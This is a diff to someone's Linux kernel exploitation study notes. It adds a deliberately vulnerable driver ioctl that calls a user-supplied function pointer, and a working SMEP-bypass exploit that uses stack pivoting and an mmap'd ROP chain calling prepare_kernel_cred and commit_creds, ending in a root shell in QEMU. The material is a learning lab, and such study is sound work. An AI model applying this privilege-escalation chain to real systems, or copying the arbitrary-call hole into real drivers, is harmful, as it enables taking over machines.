@@ -24,6 +24,8 @@
 * [Bypassing SMEP](#bypassing-smep)  
 	 * [ROP gadgets](#rop-gadgets)  
 	 * [ROP chaining](#rop-chaining)
+	 * [Improving kernel module](#improving-kernel-module)
+	 * [Bypass SMEP with stack pivoting](#bypass-smep-with-stack-pivoting)
 
 ## Creating the enviornment and the first kernel module
 
@@ -39,7 +41,16 @@ From here basically following the steps in the following website:
 https://www.nullbyte.cat/post/linux-kernel-exploit-development-environment/
 
 ### Building linux kernel
-Configured everything just like on the website, but didnt apply KASan debugger and didn't disable any security features (will disable kaslr in qemu).
+Configured everything just like on the website, but didnt apply KASan debugger and didn't disable any security features (will disable kaslr in qemu).  
+
+##### Fixing debug issues  
+On some hosts, there is a problem, where after hitting a breakpoint in the kernel module in gdb, no matter what we do, stepping will result in a totally other function, which has to do something with time. We can fix this by setting the following configurations in make menuconfig:  
+```
+Processor type and features -> Linux guest support -> yes
+Processor type and features -> Linux guest support -> Enable paravirtualization code -> yes
+Processor type and features -> Linux guest support -> KVM Guest support (including kvmclock) -> yes
+Processor type and features -> Support x2apic -> yes
+```  
 
 ### Compiling buildroot
 Same as above, selected ext2 fs, made init script and added root and 'user' users by creating shadow and passwd files (passwords are root and user).
@@ -753,3 +764,101 @@ uid=1000(user) gid=1000 groups=1000
 uid=0(root) gid=0(root)
 ```  
 A root shell again!  
+
+### Improving kernel module  
+Now that we are familiar with stack buffer overflows, it's time to try something new. Let's add an ioctl command to our kernel driver, which calls the function, which is given as a function pointer in the parameter. This addition is in the bof2 driver.  
+```C
+void (*fn)(void);
+...
+switch(cmd){
+...
+	case IOCTL_FUNC:{
+            printk(KERN_INFO "Call func\n");
+            fn = (void (*)(void))arg;
+            fn();
+            break;
+        }
+```
+An addition to this driver is the header file, which generates these cmd macros from now on:  
+```C
+#define IOCTL_MAGIC 0x33
+#define IOCTL_READ 		_IOWR(IOCTL_MAGIC, 0, unsigned long)
+#define IOCTL_WRITE 		_IOWR(IOCTL_MAGIC, 1, unsigned long)
+#define IOCTL_FUNC      	_IOWR(IOCTL_MAGIC, 2, unsigned long)
+```  
+For the sake of simplicity we can include this header into our exploit, so we can invoke these commands through ioctl.  
+### Bypass SMEP with stack pivoting  
+Stack pivoting is a technique, which makes possible, to perform a ROP chain without overwriting anythin after the first return pointer on the stack. So we could do the following exploit using a simple buffer overflow, but we are gonna use instead the function pointer ioctl command in our kernel driver. 
+The base of stack pivoting is a stack lift. This means, we are modifying the pointer in `rsp` into another place of the memory, which we can control. For this, we need to find a ROP gadget, which moves a constant value into the stack register, preferably one, that is a user space memory address, and which we can allocate using mmap. `mmap` has a minimum address, and below that we cannot allocate memory. We can find this with the following command:  
+```
+# cat /proc/sys/vm/mmap_min_addr 
+4096
+```  
+So we need a gadget, that moves a value bigger than 0x1000 into rsp, but it should be low enough to be an userland address. After some search we can find a perfect address:  
+`0xffffffff81458a59 : mov esp, 0x5b000000 ; pop rbp ; ret`  
+So, we can add this address to our other ROP addresses, and send this as our payload to the device file.  
+```C
+unsigned long stacklift = 0xffffffff81458a59;
+...
+ret = ioctl(fd, IOCTL_FUNC, stacklift);
+if(ret < 0){
+	printf("[-] Failed to write to run function\n");
+        exit(-1);
+}
+```  
+After this we need to mmap this address with some space (I used a whole page, so 0x1000 bytes), and fill it with our ROP gadgets from the previous exploit.  
+```C
+void create_rop_mem(){
+    printf("[+] Creating ROP chain on memory...\n");
+    unsigned long *mem = mmap((void*)newstack, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, -1, 0);
+    unsigned int off = 0;
+    mem[off++] = 0x1337;
+    mem[off++] = pop_rdi_ret; // pop rdi; ret;
+    mem[off++] = 0; // to rdi
+    mem[off++] = prepare_kernel_cred;
+    mem[off++] = pop_rdx_ret; // pop rdx; ret;
+    mem[off++] = 8; // to rdx
+    mem[off++] = cmp_rdx_8_jne_ret; // cmp rdx, 8; jne; ret;
+    mem[off++] = mov_rdi_rax_jne_xor_ret; // mov rdi, rax; jne; xor eax, eax; ret;
+    mem[off++] = commit_creds;
+    mem[off++] = swapgs_nop3_xor_ret; // swapgs; nop; nop; nop; xor rbx, rbx ret;
+    mem[off++] = iretq;
+    mem[off++] = user_rip;
+    mem[off++] = user_cs;
+    mem[off++] = user_rflags;
+    mem[off++] = user_sp;
+    mem[off++] = user_ss;
+}
+```  
+Ok. We are already set. Let's try this exploit. But unluckily, we get a kernel panic:  
+```
+[+] Sending payload...
+[  364.211701] Call func
+[  364.212349] traps: PANIC: double fault, error_code: 0x0
+[  364.212351] double fault: 0000 [#1] SMP NOPTI
+[  364.212352] CPU: 0 PID: 167 Comm: smep Tainted: G           O      5.11.7 #2
+[  364.212354] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014
+[  364.212355] RIP: 0010:kmem_cache_alloc+0x5/0x1b0
+```  
+This is because `prepare_kernel_cred` and `commit_creds` need stack space to work, but we put the top of the stack in the beginning of the allocated memory. We need more space for them. To fix it, we can allocate 2 pages, one before the stacklift address:  
+```C
+unsigned long *mem = mmap((void*)newstack-0x1000, 0x2000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, -1, 0);
+mem[0] = 0x31337;
+unsigned int off = 0x1000 / 8;
+```  
+So, we set the starting address 0x1000 (page size) before the stacklift address, and set the size to 0x2000 (2 pages). If we try to run the exploit like this, we will get a double error again, because the first page won't have anything on it, so it won't be moved into the page table. I got around it by putting a dummy value in the beginning of it. Of course, the want the ROP chain in the original stacklift address. Now we can try the exploit again:  
+```
+# id
+uid=1000(user) gid=1000 groups=1000
+# ./smep
+[+] Opening device file...
+[+] Creating ROP chain on memory...
+[+] Sending payload...
+[  761.051905] Call func
+[+] Returned to userland, spawning root shell...
+[+] Privilege level successfully escalated, spawning shell...
+/home/user # id
+uid=0(root) gid=0(root)
+```  
+Another root shell!!  
+##### Note for myself: SAVE THE DAMN STATE!!!
